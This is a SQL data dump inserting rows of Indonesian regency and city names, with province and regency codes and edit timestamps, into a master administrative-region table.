INSERT INTO `sdp_master_kabkot` VALUES (133, '14', '03', 'KABUPATEN BENGKALIS', NULL, NULL, '1', NULL, NULL, 1, '2019-11-20 22:44:42', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (134, NULL, NULL, 'KABUPATEN ROKAN HILIR', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:49', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (135, NULL, NULL, 'KABUPATEN KEPULAUAN MERANTI', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:49', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (136, NULL, NULL, 'KOTA PEKANBARU', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:49', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (137, NULL, NULL, 'KOTA D U M A I', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:49', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (138, '15', '01', 'KABUPATEN KERINCI', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:32:58', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (139, '15', '02', 'KABUPATEN MERANGIN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:33:15', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (140, '15', '03', 'KABUPATEN SAROLANGUN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:33:39', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (141, '15', '04', 'KABUPATEN BATANG HARI', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:33:52', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (142, '15', '05', 'KABUPATEN MUARO JAMBI', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:34:13', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (143, '15', '07', 'KABUPATEN TANJUNG JABUNG TIMUR', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:34:47', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (144, '15', '06', 'KABUPATEN TANJUNG JABUNG BARAT', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:34:31', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (145, '15', '09', 'KABUPATEN TEBO', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:35:14', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (146, '15', '08', 'KABUPATEN BUNGO', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:35:02', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (147, '15', '71', 'KOTA JAMBI', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:35:30', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (148, '15', '72', 'KOTA SUNGAI PENUH', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:36:27', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (149, NULL, NULL, 'KABUPATEN OGAN KOMERING ULU', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:49', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (150, NULL, NULL, 'KABUPATEN OGAN KOMERING ILIR', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:49', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (151, NULL, NULL, 'KABUPATEN MUARA ENIM', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:49', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (152, NULL, NULL, 'KABUPATEN LAHAT', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:50', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (153, NULL, NULL, 'KABUPATEN MUSI RAWAS', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:50', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (154, NULL, NULL, 'KABUPATEN MUSI BANYUASIN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:50', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (155, NULL, NULL, 'KABUPATEN BANYU ASIN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:50', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (156, NULL, NULL, 'KABUPATEN OGAN KOMERING ULU SELATAN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:50', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (157, NULL, NULL, 'KABUPATEN OGAN KOMERING ULU TIMUR', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:50', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (158, NULL, NULL, 'KABUPATEN OGAN ILIR', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:50', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (159, NULL, NULL, 'KABUPATEN EMPAT LAWANG', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:50', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (160, NULL, NULL, 'KABUPATEN PENUKAL ABAB LEMATANG ILIR', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:50', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (161, NULL, NULL, 'KABUPATEN MUSI RAWAS UTARA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:50', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (162, NULL, NULL, 'KOTA PALEMBANG', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:50', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (163, NULL, NULL, 'KOTA PRABUMULIH', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:50', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (164, NULL, NULL, 'KOTA PAGAR ALAM', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:50', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (165, NULL, NULL, 'KOTA LUBUKLINGGAU', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:50', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (166, '17', '01', 'KABUPATEN BENGKULU SELATAN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:20:59', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (167, '17', '02', 'KABUPATEN REJANG LEBONG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:21:20', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (168, '17', '03', 'KABUPATEN BENGKULU UTARA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:21:33', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (169, '17', '04', 'KABUPATEN KAUR', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:21:46', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (170, '17', '05', 'KABUPATEN SELUMA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:22:00', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (171, '17', '06', 'KABUPATEN MUKOMUKO', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:22:13', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (172, '17', '07', 'KABUPATEN LEBONG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:22:26', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (173, '17', '08', 'KABUPATEN KEPAHIANG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:22:44', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (174, '17', '09', 'KABUPATEN BENGKULU TENGAH', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:22:59', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (175, '17', '71', 'KOTA BENGKULU', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:23:22', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (176, NULL, NULL, 'KABUPATEN LAMPUNG BARAT', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:50', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (177, NULL, NULL, 'KABUPATEN TANGGAMUS', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:50', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (178, NULL, NULL, 'KABUPATEN LAMPUNG SELATAN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:50', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (179, NULL, NULL, 'KABUPATEN LAMPUNG TIMUR', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:50', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (180, NULL, NULL, 'KABUPATEN LAMPUNG TENGAH', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:50', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (181, NULL, NULL, 'KABUPATEN LAMPUNG UTARA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:50', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (182, NULL, NULL, 'KABUPATEN WAY KANAN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:50', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (183, NULL, NULL, 'KABUPATEN TULANGBAWANG', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:50', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (184, NULL, NULL, 'KABUPATEN PESAWARAN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:50', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (185, NULL, NULL, 'KABUPATEN PRINGSEWU', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:50', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (186, NULL, NULL, 'KABUPATEN MESUJI', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:50', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (187, NULL, NULL, 'KABUPATEN TULANG BAWANG BARAT', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:50', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (188, NULL, NULL, 'KABUPATEN PESISIR BARAT', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:50', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (189, NULL, NULL, 'KOTA BANDAR LAMPUNG', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:50', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (190, NULL, NULL, 'KOTA METRO', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:50', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (191, '19', '01', 'KABUPATEN BANGKA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:28:04', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (192, '19', '02', 'KABUPATEN BELITUNG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:28:27', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (193, '19', '05', 'KABUPATEN BANGKA BARAT', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:29:12', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (194, '19', '04', 'KABUPATEN BANGKA TENGAH', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:28:54', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (195, '19', '03', 'KABUPATEN BANGKA SELATAN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:28:40', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (196, '19', '06', 'KABUPATEN BELITUNG TIMUR', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:29:37', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (197, '19', '71', 'KOTA PANGKAL PINANG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:29:52', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (198, '21', '02', 'KABUPATEN KARIMUN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:30:32', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (199, '21', '01', 'KABUPATEN BINTAN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:30:15', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (200, '21', '03', 'KABUPATEN NATUNA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:30:44', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (201, '21', '04', 'KABUPATEN LINGGA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:30:59', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (202, '21', '05', 'KABUPATEN KEPULAUAN ANAMBAS', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:31:19', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (203, NULL, NULL, 'KOTA B A T A M', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:51', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (204, '21', '72', 'KOTA TANJUNG PINANG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 13:32:31', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (205, '31', '01', 'KABUPATEN KEPULAUAN SERIBU', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:25:24', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (206, '31', '74', 'KOTA JAKARTA SELATAN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:26:28', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (207, '31', '75', 'KOTA JAKARTA TIMUR', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:26:49', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (208, '31', '71', 'KOTA JAKARTA PUSAT', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:25:40', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (209, '31', '73', 'KOTA JAKARTA BARAT', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:26:12', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (210, '31', '72', 'KOTA JAKARTA UTARA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:25:57', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (211, '32', '01', 'KABUPATEN BOGOR', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:41:56', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (212, '32', '02', 'KABUPATEN SUKABUMI', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:42:22', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (213, '32', '03', 'KABUPATEN CIANJUR', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:42:40', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (214, '32', '04', 'KABUPATEN BANDUNG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:42:57', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (215, '32', '05', 'KABUPATEN GARUT', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:43:10', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (216, '32', '06', 'KABUPATEN TASIKMALAYA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:43:27', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (217, '32', '07', 'KABUPATEN CIAMIS', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:43:49', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (218, '32', '08', 'KABUPATEN KUNINGAN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:44:08', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (219, '32', '09', 'KABUPATEN CIREBON', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:44:24', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (220, '32', '10', 'KABUPATEN MAJALENGKA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:44:38', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (222, '32', '12', 'KABUPATEN INDRAMAYU', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:45:07', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (223, '32', '13', 'KABUPATEN SUBANG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:45:23', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (224, '32', '14', 'KABUPATEN PURWAKARTA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:45:36', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (225, '32', '15', 'KABUPATEN KARAWANG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:45:51', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (226, '32', '16', 'KABUPATEN BEKASI', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:46:09', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (227, '32', '17', 'KABUPATEN BANDUNG BARAT', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:46:24', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (228, '32', '18', 'KABUPATEN PANGANDARAN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:46:37', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (229, '32', '71', 'KOTA BOGOR', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:46:49', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (230, '32', '72', 'KOTA SUKABUMI', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:47:10', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (231, '32', '73', 'KOTA BANDUNG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:47:26', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (232, '32', '74', 'KOTA CIREBON', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:47:45', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (233, '32', '75', 'KOTA BEKASI', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:48:02', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (234, '32', '76', 'KOTA DEPOK', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:48:18', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (235, '32', '77', 'KOTA CIMAHI', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:48:29', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (236, '32', '78', 'KOTA TASIKMALAYA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:48:44', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (237, '32', '79', 'KOTA BANJAR', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:48:58', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (238, '33', '01', 'KABUPATEN CILACAP', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:16:27', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (239, '33', '02', 'KABUPATEN BANYUMAS', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:16:51', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (240, '33', '03', 'KABUPATEN PURBALINGGA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:17:07', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (241, '33', '04', 'KABUPATEN BANJARNEGARA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:17:21', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (242, '33', '05', 'KABUPATEN KEBUMEN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:17:39', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (243, '33', '06', 'KABUPATEN PURWOREJO', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:17:52', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (244, '33', '07', 'KABUPATEN WONOSOBO', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:18:25', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (245, '33', '08', 'KABUPATEN MAGELANG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:18:38', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (246, '33', '09', 'KABUPATEN BOYOLALI', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:18:52', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (247, '33', '10', 'KABUPATEN KLATEN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:19:30', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (249, '33', '12', 'KABUPATEN WONOGIRI', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:19:57', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (250, '33', '13', 'KABUPATEN KARANGANYAR', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:20:14', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (251, '33', '14', 'KABUPATEN SRAGEN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:20:29', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (252, '33', '15', 'KABUPATEN GROBOGAN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:20:50', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (253, '33', '16', 'KABUPATEN BLORA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:21:01', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (254, '33', '17', 'KABUPATEN REMBANG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:21:12', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (255, '33', '18', 'KABUPATEN PATI', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:21:25', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (256, '33', '19', 'KABUPATEN KUDUS', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:21:37', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (257, '33', '20', 'KABUPATEN JEPARA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:21:53', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (258, '33', '21', 'KABUPATEN DEMAK', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:22:05', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (259, '33', '22', 'KABUPATEN SEMARANG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:22:17', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (260, '33', '23', 'KABUPATEN TEMANGGUNG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:22:29', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (261, '33', '24', 'KABUPATEN KENDAL', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:22:55', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (262, '33', '25', 'KABUPATEN BATANG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:23:12', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (263, '33', '26', 'KABUPATEN PEKALONGAN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:23:38', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (264, '33', '27', 'KABUPATEN PEMALANG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:23:54', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (265, '33', '28', 'KABUPATEN TEGAL', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:24:12', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (266, '33', '29', 'KABUPATEN BREBES', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:24:24', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (267, '33', '71', 'KOTA MAGELANG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:24:38', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (268, '33', '72', 'KOTA SURAKARTA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:24:49', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (269, '33', '73', 'KOTA SALATIGA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:25:01', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (270, '33', '74', 'KOTA SEMARANG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:25:16', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (271, '33', '75', 'KOTA PEKALONGAN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:25:29', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (272, '33', '76', 'KOTA TEGAL', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:25:45', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (273, '34', '01', 'KABUPATEN KULON PROGO', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:23:43', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (274, '34', '02', 'KABUPATEN BANTUL', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:24:02', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (275, '34', '03', 'KABUPATEN GUNUNG KIDUL', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:24:20', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (276, '34', '04', 'KABUPATEN SLEMAN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:24:32', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (277, '34', '71', 'KOTA YOGYAKARTA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:25:02', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (278, '35', '01', 'KABUPATEN PACITAN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:26:15', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (279, '35', '02', 'KABUPATEN PONOROGO', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:26:29', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (280, '35', '03', 'KABUPATEN TRENGGALEK', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:26:41', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (281, '35', '04', 'KABUPATEN TULUNGAGUNG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:27:17', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (282, '35', '05', 'KABUPATEN BLITAR', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:27:40', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (283, '35', '06', 'KABUPATEN KEDIRI', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:27:52', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (284, '35', '07', 'KABUPATEN MALANG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:34:40', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (285, '35', '08', 'KABUPATEN LUMAJANG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:38:45', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (286, '35', '09', 'KABUPATEN JEMBER', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:39:00', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (287, '35', '10', 'KABUPATEN BANYUWANGI', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:39:15', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (288, '35', '10', 'KABUPATEN BONDOWOSO', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:39:36', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (289, '35', '12', 'KABUPATEN SITUBONDO', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:39:50', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (290, '35', '13', 'KABUPATEN PROBOLINGGO', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:40:06', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (291, '35', '14', 'KABUPATEN PASURUAN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:40:21', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (292, '35', '15', 'KABUPATEN SIDOARJO', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:40:34', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (293, '35', '16', 'KABUPATEN MOJOKERTO', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:40:49', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (294, '35', '17', 'KABUPATEN JOMBANG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:51:29', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (295, '35', '18', 'KABUPATEN NGANJUK', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:51:52', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (296, '35', '19', 'KABUPATEN MADIUN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:52:35', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (297, '35', '20', 'KABUPATEN MAGETAN ', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:52:45', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (298, '35', '21', 'KABUPATEN NGAWI', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:53:04', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (299, '35', '22', 'KABUPATEN BOJONEGORO', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 12:53:20', '::1');
